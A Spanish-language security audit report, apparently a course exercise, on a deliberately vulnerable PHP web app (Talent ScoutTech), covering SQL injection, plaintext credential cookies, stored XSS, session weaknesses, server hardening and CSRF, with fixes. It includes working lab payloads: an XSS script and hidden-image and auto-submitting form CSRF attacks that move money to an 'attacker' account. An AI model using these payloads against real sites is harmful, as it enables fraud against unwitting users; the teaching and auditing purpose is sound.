
# Informe de Seguridad – Proyecto Talent ScoutTech

---

## Parte 1 – Análisis de Vulnerabilidades de Autenticación

### 1.a – Inyección SQL por concatenación de parámetros

Al introducir el carácter `'` en el campo **username**, la aplicación genera un error interno, evidenciando que la consulta SQL falla por una sintaxis inválida.
Esto indica que el valor introducido por el usuario se concatena directamente en la consulta SQL sin validación ni uso de consultas preparadas, lo que expone a la aplicación a ataques de **SQL Injection**.


<img width="663" height="22" alt="image" src="https://github.com/user-attachments/assets/288841d7-089a-440c-a706-7b3bf7761d24" />


---

### 1.b – Ataque de diccionario mediante SQL Injection

Se intentó realizar un ataque de diccionario aprovechando la vulnerabilidad de SQL Injection detectada en el apartado anterior.
El ataque no tuvo éxito, ya que no fue posible autenticarse utilizando este método.

Para continuar con la auditoría, se accedió al sistema utilizando las credenciales proporcionadas por el enunciado:

* **Usuario:** `luis`
* **Contraseña:** `1234`

<img width="253" height="493" alt="image" src="https://github.com/user-attachments/assets/db980ade-7647-48e0-8b34-1d66d3a1410a" />


---

### 1.c – Gestión insegura de credenciales

Se observa que la aplicación gestiona las credenciales mediante **cookies**, almacenando el nombre de usuario y la contraseña en texto plano.
Este enfoque supone un riesgo elevado, ya que un atacante podría interceptar o manipular dichas cookies y obtener acceso no autorizado al sistema.

No se implementan mecanismos adicionales de seguridad como:

* Hash de contraseñas
* Tokens de sesión
* Cookies con atributos `HttpOnly` o `Secure`

<img width="537" height="288" alt="image" src="https://github.com/user-attachments/assets/3107acf6-e2d5-4fa0-a290-a0998199be92" />


---

### 1.d – Exposición de archivos de respaldo

Se intentó acceder a un posible archivo de respaldo del código fuente mediante la URL:

```
http://localhost/web/add_comment.php~.php
```

El servidor respondió con una pagina de copia .

<img width="278" height="683" alt="image" src="https://github.com/user-attachments/assets/e9bcf886-376a-438b-abc4-b312574afa2c" />


---

## Parte 2 – Cross-Site Scripting (XSS)

### 2.a – Prueba de XSS mediante comentarios

Se creó un comentario malicioso cuyo contenido incluye código JavaScript para generar un **alert** cuando cualquier usuario consulte los comentarios del jugador afectado (`show_comments.php`).

Ejemplo de comentario:

```html
<script>alert('XSS')</script>
```

Al acceder al listado de comentarios, el navegador ejecuta el código JavaScript embebido, confirmando que la aplicación es vulnerable a **XSS almacenado**.

<img width="277" height="593" alt="image" src="https://github.com/user-attachments/assets/fe4781e6-fb12-40d7-b534-2bfe39a1f6e4" />


<img width="463" height="168" alt="image" src="https://github.com/user-attachments/assets/feb8127f-538c-48b4-818d-6c9f5bf76563" />

---

### 2.b – Uso de `&amp;` en enlaces HTML

En el código HTML de la aplicación, los enlaces con parámetros GET utilizan `&amp;` en lugar de `&`:

```html
<a href="index.php?amount=100&amp;destination=ACMEScouting">
```

Esto ocurre porque en HTML el carácter `&` debe escaparse para cumplir con el estándar. El navegador interpreta correctamente `&amp;` como `&`.

---

### 2.c – Problema de seguridad en `show_comments.php` y solución

**Problema:**
El contenido de los comentarios se imprime directamente en el HTML, sin escape ni saneamiento, permitiendo XSS almacenado.

**Solución:**
Escapar correctamente el contenido del usuario:

```php
htmlspecialchars($comentario, ENT_QUOTES, 'UTF-8');
```

Con esto, el código JavaScript se mostrará como texto y no se ejecutará.

---

### 2.d – Otras páginas afectadas

Para comprobar si existían más páginas vulnerables a XSS, se reutilizó el mismo payload empleado anteriormente:

<script>alert('XSS')</script>

Este payload se introdujo en distintos campos de entrada gestionados por la aplicación, como nombres y comentarios, y posteriormente se accedió a las páginas donde dicha información es mostrada.

Durante las pruebas se observó que, al acceder a páginas como `list_players.php`, el código JavaScript se ejecutaba automáticamente al renderizar los datos almacenados, mostrando un alert en el navegador.

Esto confirma que no se trata de una vulnerabilidad aislada, sino de un problema generalizado: cualquier página que muestre datos introducidos por el usuario sin aplicar mecanismos de escape o validación (`htmlspecialchars`) es vulnerable a ataques XSS almacenados.

<img width="281" height="532" alt="image" src="https://github.com/user-attachments/assets/4f1ebdbf-7559-4ad8-bcf7-6c6e3d5bdcc1" />

---

## Parte 3 – Control de acceso, autenticación y sesiones

### 3.a – Seguridad en `register.php`

**Problemas detectados:**

* Contraseñas en texto plano
* Falta de validación de entradas
* Ausencia de políticas de contraseñas

**Medidas implementables:**

* Hash de contraseñas con `password_hash()`
* Validación básica de formularios
* Consultas preparadas para evitar SQL Injection

---

### 3.b – Seguridad en login

**Problemas detectados:**

* Comparación directa de contraseñas
* Uso de cookies inseguras
* No regeneración de sesión

**Medidas implementables:**

* Uso de `$_SESSION` para gestionar autenticación
* Verificación segura con `password_verify()`
* `session_regenerate_id(true)` tras login

---

### 3.c – Control de acceso a `register.php`

**Problema:** La página es accesible para cualquier usuario.

**Medidas implementables:**

* Restringir acceso a administradores
* Redirigir usuarios no autorizados a `index.php`

---

### 3.d – Acceso a la carpeta `private`

**Problema:** En entornos locales, la carpeta puede ser accesible.

**Medidas implementables:**

* Archivo `.htaccess` con `Deny from all`
* Mover `private` fuera del directorio público

---

### 3.e – Seguridad de sesión

**Problema:** Uso de cookies en lugar de sesiones y ausencia de regeneración de sesión.

**Medidas implementables:**

* Sustituir cookies por sesiones
* Regenerar el ID de sesión tras login
* Validar sesión en cada página privada
* Cierre correcto de sesión con `session_destroy()`

---

## Parte 4 – Seguridad del servidor web

**Medidas recomendadas:**

1. Mantener Apache, PHP y SQLite actualizados.
2. Configuración de Apache:

   * Ocultar información (`ServerTokens Prod`, `ServerSignature Off`)
   * Bloquear carpetas sensibles (`private`)
   * Deshabilitar listados de directorio (`Options -Indexes`)
   * Habilitar HTTPS
3. Configuración de PHP:

   * Desactivar funciones peligrosas (`exec`, `shell_exec`, etc.)
   * `display_errors = Off` en producción
   * Registrar errores en logs
4. Protección de bases de datos:

   * Archivos fuera del directorio público
   * Permisos restringidos (`chmod 600`)
5. Medidas adicionales:

   * Firewall, limitación de intentos de login, copias de seguridad y monitorización de logs

---

## Parte 5 – CSRF

### 5.a – Botón malicioso en `list_players.php`

Se añadió un botón **Profile** que envía una petición GET a:

```
http://web.pagos/donate.php?amount=100&receiver=attacker
```

Al pulsar el botón, el usuario realiza la donación sin saberlo.

📸 *[Añadir captura del listado con botón]*

---

### 5.b – Ataque CSRF sin interacción

Se introdujo un comentario que ejecuta la petición automáticamente al cargar la página:

```html
<img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none">
```

Esto realiza la donación automáticamente si el usuario está autenticado en `web.pagos`.

📸 *[Añadir captura del comentario malicioso]*

---

### 5.c – Condición para que el ataque tenga éxito

El usuario que visualice el comentario o pulse el botón debe **estar autenticado en `web.pagos`**, ya que el sistema necesita restar 100€ de su cuenta y sumar a la del atacante.

---

### 5.d – CSRF mediante POST

Si `donate.php` recibe parámetros por POST, sigue siendo vulnerable.
Ejemplo de ataque mediante formulario y JavaScript:

```html
<form action="http://web.pagos/donate.php" method="POST" id="csrfForm">
    <input type="hidden" name="amount" value="100">
    <input type="hidden" name="receiver" value="attacker">
</form>

<script>
    document.getElementById('csrfForm').submit();
</script>
```

Se puede insertar en comentarios XSS, ejecutándose automáticamente.

---





